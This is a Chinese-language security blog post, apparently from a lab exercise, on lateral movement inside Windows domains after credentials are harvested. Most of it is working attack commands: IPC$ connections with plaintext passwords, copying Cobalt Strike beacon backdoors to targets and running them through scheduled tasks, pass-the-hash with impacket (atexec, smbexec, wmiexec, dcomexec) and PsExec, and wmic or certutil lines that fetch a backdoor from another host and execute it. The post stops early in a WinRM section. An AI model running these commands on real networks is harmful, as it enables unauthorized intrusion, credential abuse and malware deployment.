<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Meteor_Kai">



    <meta name="description" content="Just Hack For Fun...">


    <meta name="keywords" content="Web exploits bring me great joy!">


<title>内网对抗-横向移动篇 | Meteor_Kai</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- 给MathJax元素添加has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- 通过连接CDN加载MathJax的js代码 -->
<script type="text/javascript" async
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


    


<meta name="generator" content="Hexo 7.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const pagebody = document.getElementsByTagName('body')[0]

            function setTheme(status) {

                if (status === 'dark') {
                    window.sessionStorage.theme = 'dark'
                    pagebody.classList.add('dark-theme');

                } else if (status === 'light') {
                    window.sessionStorage.theme = 'light'
                    pagebody.classList.remove('dark-theme');
                }
            };

            setTheme(window.sessionStorage.theme)
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Meteor_Kai&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                <a class="menu-item" href="/archives">Posts</a>
                
                <a class="menu-item" href="/categories">Categories</a>
                
                <a class="menu-item" href="/tags">Tags</a>
                
                <a class="menu-item" href="/about">About</a>
                
                <a class="menu-item" href="/links">links</a>
                
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Meteor_Kai&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">
                    <svg class="menu-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M4.5 17.27q-.213 0-.356-.145T4 16.768t.144-.356t.356-.143h15q.213 0 .356.144q.144.144.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.144T4 11.999t.144-.356t.356-.143h15q.213 0 .356.144t.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.143Q4 7.443 4 7.23t.144-.356t.356-.143h15q.213 0 .356.144T20 7.23t-.144.356t-.356.144z"/></svg>
                    <svg class="close-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Material Symbols Light by Google - https://github.com/google/material-design-icons/blob/master/LICENSE --><path fill="currentColor" d="m12 12.708l-5.246 5.246q-.14.14-.344.15t-.364-.15t-.16-.354t.16-.354L11.292 12L6.046 6.754q-.14-.14-.15-.344t.15-.364t.354-.16t.354.16L12 11.292l5.246-5.246q.14-.14.345-.15q.203-.01.363.15t.16.354t-.16.354L12.708 12l5.246 5.246q.14.14.15.345q.01.203-.15.363t-.354.16t-.354-.16z"/></svg>
                </div>
            </div>
            <div class="menu" id="mobile-menu">
                
                <a class="menu-item" href="/archives">Posts</a>
                
                <a class="menu-item" href="/categories">Categories</a>
                
                <a class="menu-item" href="/tags">Tags</a>
                
                <a class="menu-item" href="/about">About</a>
                
                <a class="menu-item" href="/links">links</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if (toggleMenu.classList.contains("active")) {
            toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        } else {
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">内网对抗-横向移动篇</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Meteor_Kai</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">May 18, 2025&nbsp;&nbsp;9:53:20</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250104134054668.png"></p>
<p>收集到域内用户和凭据后，为后续利用各种协议密码喷射通讯上线提供条件。这里注意域内域外是有差异的。</p>
<p>我们需要判断当前获得的权限是域内的还是域外的，如一个计算机有两个角色，一个是Meteor_Kai，对应域外用户，一个是webadmin，对应域内用户。</p>
<p>钓鱼攻击可能获得域内用户也可能获得域外用户。</p>
<p>判断域内域外很好判断，随便使用一个域内查询命令即可，看会不会正常回显。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure>

<p>如果是域外用户，那么我们内网域横向移动的手法也就不一定能用了。</p>
<h2 id="域外用户"><a href="#域外用户" class="headerlink" title="域外用户"></a>域外用户</h2><p>1.假设我们上线的是administrator，如果我们收集内网域的信息，很大可能会失败。同时不能正常通讯内网域。我们可以尝试提权到system，system是无敌的你可能这么想。</p>
<p>2.也可以通过其他用户上线来转到域内用户，cs上线后使用mimikatz抓取明文密码，进行密码的收集后进行其他用户上线。</p>
<p>3.也可以通过以下工具来进行域内用户的枚举</p>
<p><a target="_blank" rel="noopener" href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe userenum --dc ip -d 域名 字典文件</span><br></pre></td></tr></table></figure>



<p>这里要注意一下mimikatz在win10或者2012R2以上，内存中默认禁止缓存明文密码，获取到的是hash。可以通过修改注册表的方式进行抓取，但需重启后重新登陆时才能抓取，实战中不太好啊！</p>
<p>无论是获取的是域内还是域外，一般都需要提权，权限太低是无法抓取明文密码的。</p>
<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><blockquote>
<p>基于口令凭据 横向移动</p>
<p>ipc smb wmi dcom winrs winrm rdp等</p>
<p>pth基于hash传递， ptt基于票据（ticket）传递， ptk基于key传递</p>
</blockquote>
<blockquote>
<p>基于漏洞</p>
<p>域控提权漏洞 Exchange漏洞攻防</p>
</blockquote>
<blockquote>
<p>基于配置</p>
<p>委派 dysnc asrep kerberos攻击 ntlmreply</p>
</blockquote>
<h3 id="基于口令凭据"><a href="#基于口令凭据" class="headerlink" title="基于口令凭据"></a>基于口令凭据</h3><p>口令凭据的横向移动手段是不会被域环境（如子域父域域森林等）影响的。</p>
<h4 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h4><p>IPC$(Internet Process Connection)是共享”命名管道”的资源，它是一个用于进程间通信的开放式命名管道，通过提供一个可信的用户名和密码，连接双方可以建立一个安全通道并通过这个通道交换加密数据，从而实现对远程计算机的访问。需要使用目标系统用户的账号密码，使用139、445端口。</p>
<ol>
<li>建立IPC链接到目标主机</li>
<li>拷贝要执行的命令脚本到目标主机</li>
<li>查看目标时间，创建计划任务，定时执行拷贝到的脚本</li>
<li>删除IPC链接</li>
</ol>
<p>#建立IPC失败的原因：</p>
<ol>
<li>目标系统不是NT或以上的操作系统</li>
<li>对方没有打开IPC$共享</li>
<li>对方未开启139、445端口，或者被防火墙屏蔽</li>
<li>输出命令、账号密码有错误</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#建立IPC常见的错误代码</span><br><span class="line">（1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限</span><br><span class="line">（2）51：网络问题，Windows 无法找到网络路径</span><br><span class="line">（3）53：找不到网络路径，可能是IP地址错误、目标未开机、目标Lanmanserver服务未启动、有防火墙等问题</span><br><span class="line">（4）67：找不到网络名，本地Lanmanworkstation服务未启动，目标删除ipc$</span><br><span class="line">（5）1219：提供的凭据和已存在的凭据集冲突，说明已建立IPC$，需要先删除</span><br><span class="line">（6）1326：账号密码错误</span><br><span class="line">（7）1792：目标NetLogon服务未启动，连接域控常常会出现此情况</span><br><span class="line">（8）2242：用户密码过期，目标有账号策略，强制定期更改密码</span><br></pre></td></tr></table></figure>

<p>IPC$利用命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">建立IPC链接</span><br><span class="line">上线Administrator权限</span><br><span class="line">net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:administrator #工作组</span><br><span class="line">net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:sqlserver\administrator #工作组</span><br><span class="line">net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:god\dbadmin #域内</span><br><span class="line"></span><br><span class="line">上线webadmin权限</span><br><span class="line">net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:administrator #理解为登录域内的administrator</span><br><span class="line">net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:sqlserver\administrator #工作组</span><br><span class="line">net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:god\dbadmin #域内</span><br><span class="line"></span><br><span class="line">net use \\192.168.3.32\ipc$ /del</span><br><span class="line"></span><br><span class="line">net use #查看ipc连接</span><br><span class="line">dir \\xx.xx.xx.xx\C$\ #查看文件列表</span><br><span class="line">将后门文件复制到目标主机的C盘</span><br><span class="line">copy 3232.exe \\192.168.3.32\C$</span><br><span class="line"></span><br><span class="line">#然后通过计划任务来执行后门文件</span><br><span class="line">[at] &amp; [schtasks]计划任务配合</span><br><span class="line">1、at &lt; Windows2012</span><br><span class="line">copy beacon.exe \\192.168.3.21\c$  #拷贝执行文件到目标机器</span><br><span class="line">at \\192.168.3.21 15:47 c:\beacon.exe   #添加计划任务</span><br><span class="line"></span><br><span class="line">2、schtasks &gt;=Windows2012</span><br><span class="line">copy beacon.exe \\192.168.3.32\c$  #拷贝执行文件到目标机器</span><br><span class="line">schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn beacon /sc DAILY /tr c:\3232.exe /F #创beacon任务对应执行文件</span><br><span class="line">schtasks /run /s 192.168.3.32 /tn beacon /i #运行beacon任务</span><br><span class="line">schtasks /delete /s 192.168.3.32 /tn beacon /f#删除beacon任务</span><br></pre></td></tr></table></figure>

<p>上线web主机后，与sql主机建立IPC连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:sqlserver\administrator</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517152130765.png" alt="image-20250517152130765"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517152146525.png" alt="image-20250517152146525"></p>
<p>然后生成一个正向后门</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250105183813273.png" alt="image-20250105183813273"></p>
<p>copy后门到3.32</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250105183942718.png" alt="image-20250105183942718"></p>
<p>查看是否成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250105184011637.png" alt="image-20250105184011637"></p>
<p>然后准备执行，利用计划任务。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250105184227882.png" alt="image-20250105184227882"></p>
<p>那就换一种计划任务。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250105184329471.png" alt="image-20250105184329471"></p>
<p>问了下小迪才知道是权限过低的原因，那么我们需要先提权。</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517152334355.png" alt="image-20250517152334355" style="zoom:80%;" />

<p>试了半天，发现工作组的administrator可以，有点奇怪哦</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517152432550.png" alt="image-20250517152432550" style="zoom:80%;" />

<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517152442451.png" alt="image-20250517152442451" style="zoom:80%;" />

<p>成功运行计划任务，然后我们去主动连接即可，因为是正向后门。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connect 192.168.3.32 3232</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517152508490.png" alt="image-20250517152508490" style="zoom:80%;" />

<p>总算成功！！！</p>
<p>但是以上操作不仅麻烦，还需要有明文密码才能进行，接下来的工具可以解决这些问题。</p>
<h5 id="impact套件"><a href="#impact套件" class="headerlink" title="impact套件"></a>impact套件</h5><p><a target="_blank" rel="noopener" href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a></p>
<p>都是python文件，把python文件传上去进行是不显示的，单单传上去就是一个问题，对方有没有python环境另说。</p>
<p>该工具是一个半交互的横向移动工具，适用于Socks代理下;本机运行，穿透目标。</p>
<p>在跳板机上建立socks节点，然后proxifier即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python atexec.py ./administrator:admin!@#45@192.168.3.32 &quot;ver&quot;</span><br></pre></td></tr></table></figure>

<p>接下来我们需要考虑的就是上线了。</p>
<p>可以考虑下载后门文件并执行或者powershell上线</p>
<p>先说第一种：目标是3网段的，只能跟3网段的通讯，但是我们只有跳板机可以与之通讯，要在跳板机开启下载的环境才行，不一定可行，流量也太大了，不推荐。</p>
<p>再说第二种：powershell无文件落地上线。</p>
<p>同时这个工具包也支持hash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python atexec.py -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517153000098.png" alt="image-20250517153000098"></p>
<p>然后配置一下proxifier即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250106172558387.png" alt="image-20250106172558387"></p>
<p>成功！！！</p>
<h4 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h4><p>服务器消息块Server Message Block，又称网络文件共享系统，SMB服务通常由文件服务器提供，它允许客户端计算机通过网络访问服务器上的共享资源。通过SMB用户可以在网络上访问和共享文件夹、文件以及打印机，从而实现在不同计算机之间方便地共享数据和打印输出。利用SMB可通过明文或HASH传递来远程执行。</p>
<p>windows2012以上默认关闭了Wdigest，所以攻击者无法通过内存获取到明文密码，有四种方法解决：</p>
<ol>
<li>利用（PTH,PTK）等进行移动不需要明文</li>
<li>利用其他服务协议（SMB&#x2F;WMI等进行哈希移动）</li>
<li>利用注册表开启（wdigest auth）进行获取</li>
<li>利用工具或者第三方平台（Hashcat）进行破解获取</li>
</ol>
<p>利用条件：</p>
<ol>
<li>文件与打印机服务开启，默认开启</li>
<li>防火墙允许135、445端口通信</li>
<li>知道目标账户密码或HASH</li>
</ol>
<p>若禁用了防火墙规则中的文件和打印机共享(SMB-In) 445端口的，那么就没法通过SMB来进行横向移动了。</p>
<h5 id="利用1-psexec"><a href="#利用1-psexec" class="headerlink" title="利用1 psexec"></a>利用1 psexec</h5><p>交互式windows官方工具</p>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\192.168.3.32 -u administrator -p admin!@#45 -s cmd</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517153025391.png" alt="image-20250517153025391" style="zoom:80%;" />

<p>执行后成功获取一个交互式的cmd，但是这种命令我们一般要在Web主机的cs上进行，cs是没有交互功能的。因此就完成不了。无法将cmd反弹到cs上进行。所以没有图形化一般就不用了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec -hashes :518b98ad4178a53695dc997aa02d455c sqlserver/administrator@192.168.3.32</span><br></pre></td></tr></table></figure>



<h5 id="利用2-smbexec-impacket"><a href="#利用2-smbexec-impacket" class="headerlink" title="利用2 smbexec-impacket"></a>利用2 smbexec-impacket</h5><p>利用impacket套件的话，一般就是建立socks节点然后本机用套件开干。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python smbexec.py sqlserver/administrator:admin!@#45@192.168.3.32</span><br><span class="line"></span><br><span class="line">python smbexec.py -hashes :518b98ad4178a53695dc997aa02d455c sqlserver/administrator@192.168.3.32</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250121182342264.png" alt="image-20250121182342264"></p>
<p>成功返回一个cmd，然后我们可以通过certutil来下载后门进行上线。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://192.168.3.31/3232.exe c:/3232.exe</span><br><span class="line">c:\3232.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250121183807036.png" alt="image-20250121183807036"></p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517153248000.png" alt="image-20250517153248000" style="zoom:80%;" />



<h5 id="利用3-cs插件"><a href="#利用3-cs插件" class="headerlink" title="利用3 cs插件"></a>利用3 cs插件</h5><p>cs-psexec</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517153258289.png" alt="image-20250517153258289" style="zoom:80%;" />

<p>也是成功上线了。</p>
<h4 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h4><p>Windows Management Instrumentation,Windows 管理规范</p>
<p>从win2003开始一直存在，原本的作用是方便管理员对windows主机进行管理。因此在内网渗透中，我们可以使用WMI进行横向移动，支持用户名明文或者hash方式进行认证，并且该方法不会在目标日志系统留下痕迹。</p>
<p>利用条件：</p>
<ol>
<li>WMI服务开启，端口135，默认开启</li>
<li>防火墙允许135，445端口通信</li>
<li>知道目标的账户密码或hash</li>
</ol>
<h5 id="利用1-wmic"><a href="#利用1-wmic" class="headerlink" title="利用1 wmic"></a>利用1 wmic</h5><p>系统内置命令（单执行）缺陷：1.不知道回显  2.只支持明文，不支持hash</p>
<p>让目标下载后门 执行后门</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell wmic /node:192.168.3.32 /user:sqlserver\administrator /password:admin!@#45 process call create &quot;certutil -urlcache -split -f http://192.168.3.31/3232.exe c:/3232.exe&quot;</span><br></pre></td></tr></table></figure>

<p>先把后门放到网站服务器，IIS网站服务器根目录在C:\inetpub\wwwroot</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517153309819.png" alt="image-20250517153309819" style="zoom:80%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell wmic /node:192.168.3.32 /user:sqlserver\administrator /password:admin!@#45 process call create &quot;c:/3232.exe&quot;</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517153322286.png" alt="image-20250517153322286" style="zoom:80%;" />

<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517153331029.png" alt="image-20250517153331029" style="zoom:80%;" />

<p>然后connect正向连接</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517153339682.png" alt="image-20250517153339682" style="zoom:80%;" />

<p>成功上线！</p>
<h5 id="利用2-cscript"><a href="#利用2-cscript" class="headerlink" title="利用2 cscript"></a>利用2 cscript</h5><p>交互式 不适用cs</p>
<p>cscript是windows自带的命令，但是这种方法不建议，因为要上传文件。而且cs无法做到交互式</p>
<p>上传wmiexec.vbs，实战中这个文件也是疯狂被杀的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345</span><br></pre></td></tr></table></figure>



<h5 id="利用3-wmiexec-impacket"><a href="#利用3-wmiexec-impacket" class="headerlink" title="利用3 wmiexec-impacket"></a>利用3 wmiexec-impacket</h5><p>交互式 支持hash</p>
<p>这种一般要用内网穿透的方法来进行，因为对方不一定有python环境，而且上传文件到目标机器本就是一个很不好的行为。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py sqlserver/administrator:admin!@#45@192.168.3.32</span><br><span class="line">python wmiexec.py sqlserver/administrator:admin!@#45@192.168.3.32 &quot;whoami&quot;</span><br><span class="line">python wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c sqlserver/administrator@192.168.3.32 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<p>首先先建立一个socks节点</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517153349392.png" alt="image-20250517153349392" style="zoom:80%;" />

<p>然后proxifier配置代理服务器</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250119225130290.png" alt="image-20250119225130290"></p>
<p>然后python执行即可。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250119225353337.png" alt="image-20250119225353337"></p>
<p>获取一个shell</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250119225408058.png" alt="image-20250119225408058"></p>
<p>上线也就是很简单了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py sqlserver/administrator:admin!@#45@192.168.3.32 &quot;certutil -urlcache -split -f http://192.168.3.31/3232.exe c:/3232.exe&quot;</span><br><span class="line"></span><br><span class="line">python wmiexec.py sqlserver/administrator:admin!@#45@192.168.3.32 &quot;c:/3232.exe&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250119225635795.png" alt="image-20250119225635795"></p>
<p>然后去cs正向连接即可上线！</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517153426101.png" alt="image-20250517153426101" style="zoom:80%;" />

<p>以下展示hash的连接：</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250119230702957.png" alt="image-20250119230702957"></p>
<h5 id="利用4-cs插件"><a href="#利用4-cs插件" class="headerlink" title="利用4 cs插件"></a>利用4 cs插件</h5><p>wmihacker&#x3D;&#x3D;cscript</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517153440686.png" alt="image-20250517153440686" style="zoom:80%;" />





<h4 id="DCOM"><a href="#DCOM" class="headerlink" title="DCOM"></a>DCOM</h4><p>参考文章：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/9u0kprGbaU1S1BEQWj18AA">https://mp.weixin.qq.com/s/9u0kprGbaU1S1BEQWj18AA</a></p>
<p>Distributed Component Object Model（分布式组件对象模型），是微软的一系列概念和程序接口。它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是Internet上。利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求。</p>
<p>利用条件：</p>
<ol>
<li>适用目标Win7系统以上，win7、win2008及其以上才有powershell，而这个DCOM的横向移动与powershell是密不可分的。</li>
<li>管理员权限 Powershell</li>
<li>远程主机防火墙未阻止</li>
</ol>
<h5 id="dcomexec-impacket"><a href="#dcomexec-impacket" class="headerlink" title="dcomexec-impacket"></a>dcomexec-impacket</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python dcomexec.py sqlserver/administrator:admin!@#45@192.168.3.32</span><br><span class="line">python dcomexec.py sqlserver/administrator:admin!@#45@192.168.3.32 whoami</span><br><span class="line">python dcomexec.py sqlserver/administrator:@192.168.3.32 whoami -hashes :518b98ad4178a53695dc997aa02d455c</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250121204739063.png" alt="image-20250121204739063"></p>
<p>一直卡在这个界面了，感觉是环境问题。。</p>
<h4 id="WinRM-WinRS"><a href="#WinRM-WinRS" class="headerlink" title="WinRM&amp;WinRS"></a>WinRM&amp;WinRS</h4><p>WinRM代表Windows远程管理，是一种允许管理员远程执行系统管理任务的服务</p>
<p>WinRS（remote shell）是内置的命令行工具，用于远程连接运行WinRM的服务器并执行大多数cmd命令</p>
<p>利用条件：</p>
<ol>
<li>win2012之前利用需要手动开启WinRM，之后是默认开启的。</li>
<li>防火墙对5986、5985端口开放</li>
</ol>
